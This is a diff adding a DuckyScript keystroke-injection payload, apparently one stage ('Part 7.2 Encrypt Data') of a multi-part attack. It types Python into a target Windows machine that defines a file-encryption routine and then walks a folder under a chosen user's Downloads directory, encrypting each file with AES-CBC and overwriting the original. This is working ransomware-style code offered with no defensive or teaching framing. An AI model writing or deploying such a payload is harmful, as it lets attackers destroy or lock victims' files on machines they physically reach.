@@ -1,0 +1,129 @@
+REM #######################################################
+REM #                                                     #
+REM #              PART 7.2 ENCRYPT DATA                  #
+REM #                                                     #
+REM #######################################################
+
+
+DELAY 1000 
+ENTER 
+DELAY 500
+ENTER 
+DELAY 400
+ENTER 
+
+STRING import os
+DELAY 140
+ENTER
+DELAY 300
+STRING from cryptography.hazmat.primitives import padding
+DELAY 240
+ENTER 
+DELAY 300
+STRING from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+DELAY 320
+ENTER 
+DELAY 300
+STRING from cryptography.hazmat.backends import default_backend
+DELAY 250 
+ENTER 
+DELAY 300
+ENTER 
+DELAY 1000
+
+STRING hi_folder_path = os.path.join(f"C:\\Users\\{selected_user}\\Downloads", "hi")
+DELAY 300
+ENTER
+DELAY 140
+ENTER 
+DELAY 140 
+STRING def encrypt_file(file_path, key, iv):
+DELAY 180
+SHIFT ENTER
+DELAY 180
+STRING     try:
+DELAY 130
+ENTER 
+DELAY 140
+STRING         with open(file_path, "rb") as f:
+DELAY 180
+ENTER
+DELAY 140 
+STRING             file_data = f.read()
+DELAY 180
+ENTER 
+DELAY 140 
+STRING         cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+DELAY 300
+ENTER 
+DELAY 140 
+STRING         encryptor = cipher.encryptor()
+DELAY 180 
+ENTER
+DELAY 140
+STRING         padder = padding.PKCS7(algorithms.AES.block_size).padder()
+DELAY 250
+ENTER 
+DELAY 140 
+STRING         padded_data = padder.update(file_data) + padder.finalize()
+DELAY 250
+ENTER 
+DELAY 140 
+STRING         encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+DELAY 300
+ENTER 
+DELAY 140
+STRING         with open(file_path, "wb") as f:
+DELAY 180
+ENTER 
+DELAY 140 
+STRING             f.write(encrypted_data)
+DELAY 180
+ENTER 
+DELAY 140 
+STRING         print(f"Encrypted: {file_path}")
+DELAY 180
+ENTER 
+DELAY 140
+STRING     except PermissionError:
+DELAY 150
+ENTER 
+DELAY 140 
+STRING         print(f"Skipped: {file_path} (Permission denied)")
+DELAY 220
+ENTER 
+DELAY 140 
+STRING     except Exception as e:
+DELAY 150
+ENTER 
+DELAY 140 
+STRING         print(f"Error encrypting {file_path}: {e}")
+DELAY 200
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140 
+
+REM PART 2 OF 7.2
+
+ENTER 
+DELAY 140 
+STRING for root, dirs, files in os.walk(hi_folder_path):
+DELAY 220
+SHIFT ENTER
+DELAY 180
+STRING     for file in files:
+DELAY 140
+ENTER 
+DELAY 140 
+STRING         file_path = os.path.join(root, file)
+DELAY 200
+ENTER 
+DELAY 140 
+STRING         encrypt_file(file_path, key, iv)
+DELAY 200
+ENTER 
+DELAY 140 
+ENTER
+
+
